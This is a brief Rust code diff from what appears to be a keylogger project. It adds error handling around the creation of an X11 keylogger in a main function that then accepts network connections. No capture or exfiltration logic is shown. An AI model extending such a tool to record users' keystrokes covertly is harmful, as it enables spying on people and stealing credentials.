@@ -31,7 +31,13 @@ fn main() -> std::io::Result<()> {
         state: Box::new(IdleState),
     };
 
-    let mut x_keylogger = KeyloggerFactory.create_keylogger(KeyloggerTypes::X);
+    let mut x_keylogger = match KeyloggerFactory.create_keylogger(KeyloggerTypes::X) {
+        Ok(xkeylogger) => xkeylogger,
+        Err(e) => {
+            log::error!("{:?}", e);
+            panic!();
+        }
+    };
 
     // accept connections
     loop {
